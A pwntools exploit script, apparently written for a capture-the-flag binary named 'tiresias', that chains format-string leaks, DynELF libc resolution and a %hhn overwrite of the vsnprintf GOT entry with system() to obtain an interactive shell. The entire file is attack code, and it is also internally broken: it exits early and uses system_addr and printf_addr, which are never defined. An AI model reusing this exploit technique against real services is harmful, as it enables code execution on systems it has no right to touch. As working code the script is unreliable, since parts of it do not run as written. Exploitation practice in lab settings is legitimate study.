from pwn import *

conn = process('./tiresias')
context.update(arch='i386', os='linux')

def exec_payload(payload):
    if b'\n' in payload:
        return b""
    conn.sendline(b"_EOF" + payload)
    log.info(f"Sending {b'_EOF' + payload}")
    conn.recvuntil(b"_EOF")
    data = conn.recvline().rstrip()
    return data

def find_leak_point():
    log.info('Finding leak point')
    for i in range(1, 2000):
        r = exec_payload(f"%{i}$pAAAAbbbb".encode())
        if b'0x62626262' in r: # chr(0x62) = 'b'
            log.success(f"Found leakpoint {i}")
            return i

def leak(addr):
    log.info(f"Leaking @ {p32(addr)}")
    r = exec_payload(f"%{leak_point}$sAAAA".encode() + p32(addr))

    if r == b'':
        #log.info(f"Returned {r}")
        log.info(f"Returned {bytes.fromhex('00')}")
        return b'\x00'

    try:
        r = r[:r.index(b'AAAA')]
    except:
        pass
    if r == b'(nil)':
        log.info(f"Returned {bytes.fromhex('00')}")
        return b'\x00'
    else:
        result = r + b'\x00'
        log.info(f"Returned {result}")
        return result

def find_elf(depth):
    log.info('Finding ELF. This might take a few seconds...')
    for i in range(1, depth + 1):
        data = exec_payload(f"%{i}$p".encode())
        if data[0:5] == b'0x804':
            log.success(f"Found start addr: {hex(int(data, 16))}")
            return int(data, 16)

def find_plt_got():
    addr = dynamic_addr
    while True:
        x = d.leak.n(addr, 2)
        if x == '\x03\x00': # PLT/GOT
            addr += 8
            return u32(d.leak.n(addr, 8))
        addr += 0x10

def find_printf():
    addr = got_addr
    while True:
        x = d.leak.n(addr, 8)
        if x == p32(printf_addr):
            return addr
        addr += 8

#leak_point = 264 # find_leak_point()
leak_point = find_leak_point()
start_address_elf = find_elf(100)
d = DynELF(leak, start_address_elf)
dynamic_addr = d.dynamic

""" dumps the binary to disk
with open('leaked_binary', 'wb') as binary:
    i = 0x8048000
    while i < 0x8048000+16000:
        leaked = leak(i)
        binary.write(leaked)
        i += len(leaked)
"""

write_addr = d.lookup('write', 'libc')
print(write_addr)
exit()
#system_addr = d.lookup('system', 'libc')
#vsnprintf_addr = d.lookup('vsnprintf', 'libc')

def find_vsnprintf():
    addr = 0x0804a000
    while True:
        x = d.leak.n(addr, 4)
        if x == p32(vsnprintf_addr):
            return addr
        addr += 4

got_vsnprintf = find_vsnprintf()

# write_addr = d.leak.n(0x0804a020, 4)
# got_read = d.leak.n(0x0804a00c, 4)

# print(hex(printf_addr), hex(system_addr))
# print(hex(u32(write_addr)), hex(u32(got_read)))
# print(f"Hello {hex(u32(got_lulz))}")
# ASLR is disabled btw

# We find the libc6_2.27-3ubuntu1.2_i386.so with these addresses

offset_system = 0x03d250
offset_write = 0x0e6ea0
libc_base = system_addr - offset_system
print(hex(libc_base))
print(hex(libc_base))
print(hex(libc_base))
print(hex(libc_base))
system = libc_base + offset_system

# Exploitation

payload = p32(got_vsnprintf) + p32(got_vsnprintf+1) + p32(got_vsnprintf+2) # 12 chars
first_byte = (p32(system)[0] - 12) % 256
second_byte = (p32(system)[1] - first_byte - 12) % 256
third_byte = (p32(system)[2] - second_byte - first_byte - 12) % 256
payload += f"%{first_byte}x%261$hhn".encode()
payload += f"%{second_byte}x%262$hhn".encode()
payload += f"%{third_byte}x%263$hhn".encode()

# print(hex(system))
# print(payload)
conn.sendline(b'sh')
conn.sendline(payload)
conn.interactive()
